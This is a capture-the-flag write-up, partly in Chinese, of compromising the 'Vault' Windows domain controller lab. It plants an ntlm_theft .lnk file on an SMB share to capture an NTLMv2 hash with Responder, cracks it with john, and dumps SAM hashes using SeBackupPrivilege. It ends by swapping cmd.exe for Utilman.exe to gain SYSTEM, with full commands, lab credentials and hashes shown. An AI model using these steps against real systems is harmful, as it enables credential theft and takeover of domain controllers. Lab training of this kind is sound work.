# Vault
![image](https://hackmd.io/_uploads/rkuOJzlTJg.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~/Vault]
└─$ nmap -sC -sV -p- 192.168.122.172                    
...
Host is up (0.10s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-25 11:16:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2025-03-24T11:09:48
|_Not valid after:  2025-09-23T11:09:48
|_ssl-date: 2025-03-25T11:17:31+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-25T11:16:52+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49799/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-25T11:16:52
|_  start_date: N/A

```
> DNS, RPC, SMB, Ldap, Kpass, WinRM

```
┌──(chw㉿CHW)-[~/Vault]
└─$ cat /etc/hosts 
192.168.122.172 vault.offsec
192.168.122.172 DC.vault.offsec
```
#### 1.2 SMB
```
┌──(chw㉿CHW)-[~/Vault]
└─$ enum4linux -a 192.168.122.172 
 =========================================( Target Information )=========================================
                                                           
Target ........... 192.168.122.172                                                                                            
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

...
```
> administrator, guest, krbtgt, domain admins, root, bin, none\
> 其他沒有資訊

```
┌──(chw㉿CHW)-[~/Vault]
└─$ smbclient -L //192.168.122.172/. -U "anonymous"                                    

Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DocumentsShare  Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.122.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
> DocumentsShare 可能是利用的點
```
┌──(chw㉿CHW)-[~/Vault]
└─$ crackmapexec smb 192.168.122.172 -u 'guest' -p '' --rid-brute
SMB         192.168.122.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB         192.168.122.172 445    DC               [+] vault.offsec\guest: 
SMB         192.168.122.172 445    DC               [+] Brute forcing RIDs
SMB         192.168.122.172 445    DC               498: VAULT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.122.172 445    DC               500: VAULT\Administrator (SidTypeUser)
SMB         192.168.122.172 445    DC               501: VAULT\Guest (SidTypeUser)
SMB         192.168.122.172 445    DC               502: VAULT\krbtgt (SidTypeUser)
SMB         192.168.122.172 445    DC               512: VAULT\Domain Admins (SidTypeGroup)
SMB         192.168.122.172 445    DC               513: VAULT\Domain Users (SidTypeGroup)
SMB         192.168.122.172 445    DC               514: VAULT\Domain Guests (SidTypeGroup)
SMB         192.168.122.172 445    DC               515: VAULT\Domain Computers (SidTypeGroup)
SMB         192.168.122.172 445    DC               516: VAULT\Domain Controllers (SidTypeGroup)
SMB         192.168.122.172 445    DC               517: VAULT\Cert Publishers (SidTypeAlias)
SMB         192.168.122.172 445    DC               518: VAULT\Schema Admins (SidTypeGroup)
SMB         192.168.122.172 445    DC               519: VAULT\Enterprise Admins (SidTypeGroup)
SMB         192.168.122.172 445    DC               520: VAULT\Group Policy Creator Owners (SidTypeGroup)
SMB         192.168.122.172 445    DC               521: VAULT\Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.122.172 445    DC               522: VAULT\Cloneable Domain Controllers (SidTypeGroup)
SMB         192.168.122.172 445    DC               525: VAULT\Protected Users (SidTypeGroup)
SMB         192.168.122.172 445    DC               526: VAULT\Key Admins (SidTypeGroup)
SMB         192.168.122.172 445    DC               527: VAULT\Enterprise Key Admins (SidTypeGroup)
SMB         192.168.122.172 445    DC               553: VAULT\RAS and IAS Servers (SidTypeAlias)
SMB         192.168.122.172 445    DC               571: VAULT\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         192.168.122.172 445    DC               572: VAULT\Denied RODC Password Replication Group (SidTypeAlias)
SMB         192.168.122.172 445    DC               1000: VAULT\DC$ (SidTypeUser)
SMB         192.168.122.172 445    DC               1101: VAULT\DnsAdmins (SidTypeAlias)
SMB         192.168.122.172 445    DC               1102: VAULT\DnsUpdateProxy (SidTypeGroup)
SMB         192.168.122.172 445    DC               1103: VAULT\anirudh (SidTypeUser)

```
#### 1.3 RPC
```
┌──(chw㉿CHW)-[~/Vault]
└─$ rpcclient -U '' -N 192.168.122.172
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

┌──(chw㉿CHW)-[~/Vault]
└─$ rpcclient -U "" 192.168.122.172
> enumdomusers

Password for [WORKGROUP\]:
rpcclient $> ls
command not found: ls
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> getdompwinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> lsaquery
Domain Name: VAULT
Domain Sid: S-1-5-21-537427935-490066102-1511301751
rpcclient $>
```
> ACCESS_DENIED


#### 1.4 LDAP
```
┌──(chw㉿CHW)-[~/Vault]
└─$ ldapsearch -x -H ldap://192.168.122.172 -D '' -w '' -b "DC=vault,DC=offsec"                      
# extended LDIF
#
# LDAPv3
# base <DC=vault,DC=offsec> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
### 2. Ntlm-theft
利用 SMB Share folder 的 DocumentsShare
#### 2.1 透過 Ntlm-theft 建立 link
```
┌──(chw㉿CHW)-[~/Tools/ntlm_theft]
└─$ python3 ntlm_theft.py -g lnk -s 192.168.45.178 -f vault               
Created: vault/vault.lnk (BROWSE TO FOLDER)
Generation Complete.

┌──(chw㉿CHW)-[~/Tools/ntlm_theft]
└─$ cp -r vault/ /home/chw/Vault
```
#### 2.2 開啟 responder
開啟 responder 監聽 VPN 網卡
```
┌──(chw㉿CHW)-[~/Vault/vault]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
```
#### 2.3 透過 SMB 將 link 上傳
```         
┌──(chw㉿CHW)-[~/Vault/vault]
└─$ smbclient -L //192.168.122.172/. -U "guest"   
Password for [WORKGROUP\guest]:
smb: \> put vault.lnk
putting file vault.lnk as \vault.lnk (6.7 kb/s) (average 6.7 kb/s)
smb: \> 
```
#### 2.4 成功收到 Hash
responder 接收到 NTLMv2 Hash
```
[+] Listening for events...                               

[SMB] NTLMv2-SSP Client   : 192.168.122.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:c5f2198475822af2:D914BD118478AA6190A58EA9D3DD02AC:01010000000000000057457C5D9DDB01F6B20BD597FA84C90000000002000800500033005000330001001E00570049004E002D0034004F00440046005A004B004600300036005A004C0004003400570049004E002D0034004F00440046005A004B004600300036005A004C002E0050003300500033002E004C004F00430041004C000300140050003300500033002E004C004F00430041004C000500140050003300500033002E004C004F00430041004C00070008000057457C5D9DDB01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370038000000000000000000  
```
> 儲存成 `anirudh.hash`
### 3. John 爆破
```
┌──(chw㉿CHW)-[~/Vault]
└─$ hashid 'anirudh::VAULT:c5f2198475822af2:D914BD118478AA6190A58EA9D3DD02AC:01010000000000000057457C5D9DDB01F6B20BD597FA84C90000000002000800500033005000330001001E00570049004E002D0034004F00440046005A004B004600300036005A004C0004003400570049004E002D0034004F00440046005A004B004600300036005A004C002E0050003300500033002E004C004F00430041004C000300140050003300500033002E004C004F00430041004C000500140050003300500033002E004C004F00430041004C00070008000057457C5D9DDB01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370038000000000000000000' -m
Analyzing 'anirudh::VAULT:c5f2198475822af2:D914BD118478AA6190A58EA9D3DD02AC:01010000000000000057457C5D9DDB01F6B20BD597FA84C90000000002000800500033005000330001001E00570049004E002D0034004F00440046005A004B004600300036005A004C0004003400570049004E002D0034004F00440046005A004B004600300036005A004C002E0050003300500033002E004C004F00430041004C000300140050003300500033002E004C004F00430041004C000500140050003300500033002E004C004F00430041004C00070008000057457C5D9DDB01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370038000000000000000000'
[+] NetNTLMv2 [Hashcat Mode: 5600]

┌──(chw㉿CHW)-[~/Vault]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  anirudh.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
SecureHM         (anirudh)     
1g 0:00:00:03 DONE (2025-03-25 08:19) 0.2923g/s 3103Kp/s 3103Kc/s 3103KC/s Seifer@14..Sarahmasri
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
> `anirudh`:`SecureHM`

### 4. Evil-WinRM
```
┌──(chw㉿CHW)-[~/Vault]
└─$ evil-winrm -i 192.168.122.172 -u anirudh -p SecureHM
                                        
Evil-WinRM shell v3.5
...
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\anirudh\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```
> SeBackupPrivilege
> >成功登入

### ✅ Get User Flag
> 在 `C:\Users\anirudh\Desktop`找到 User flag

發現可以直接到 `C:\Users\Administrator\Desktop`
```
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/25/2025   4:10 AM             34 proof.txt
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
Access to the path 'C:\Users\Administrator\Desktop\proof.txt' is denied.
At line:1 char:1
+ type proof.txt
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\proof.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```
> 但沒有權限開啟

## Privileges Escalation
### 5. SeBackupPrivilege: Shadow Copy
```
*Evil-WinRM* PS C:\Users\anirudh\Desktop> reg save HKLM\SYSTEM system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\anirudh\Desktop> reg save HKLM\SAM sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\anirudh\Desktop> ls


    Directory: C:\Users\anirudh\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/25/2025   6:03 AM             34 local.txt
-a----        3/25/2025   6:34 AM          49152 sam
-a----        3/25/2025   6:30 AM       16478208 system

*Evil-WinRM* PS C:\Users\anirudh\Desktop> download system
                                        
Info: Downloading C:\Users\anirudh\Desktop\system to system
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\anirudh\Desktop> download sam
                                        
Info: Downloading C:\Users\anirudh\Desktop\sam to sam
                                        
Info: Download successful!
```

### 6. 使用 secretsdump
```
┌──(chw㉿CHW)-[~/Vault]
└─$ impacket-secretsdump  -system system -sam sam LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:608339ddc8f434ac21945e026887dc36:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...            
                                                        
┌──(chw㉿CHW)-[~/Vault]
└─$ evil-winrm -i 192.168.122.172 -u Administrator -H 608339ddc8f434ac21945e026887dc36                                 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```
> 爆破出來的 Hash 是 local user
> 在 Domain Controller 上登入無效

### 7. SeRestorePrivilege: Utilman.exe Hijack
如果我們重新啟動或登出機器並在登入畫面上按 Windows 鍵 + U，系統將以系統權限啟動
`Utilman.exe` 是 Windows login screen 上可以啟動的「輔助工具」
```
*Evil-WinRM* PS C:\Users\anirudh\Desktop> mv C:/Windows/System32/Utilman.exe C:/Windows/System32/Utilman.old
*Evil-WinRM* PS C:\Users\anirudh\Desktop> mv C:/Windows/System32/cmd.exe C:/Windows/System32/Utilman.exe

```
啟動 RDP，點選輔助工具
```
┌──(chw㉿CHW)-[~/Vault]
└─$ rdesktop 192.168.122.172

```
![image](https://hackmd.io/_uploads/S1mjo4x61x.png)

### ✅ Get Root FLAG
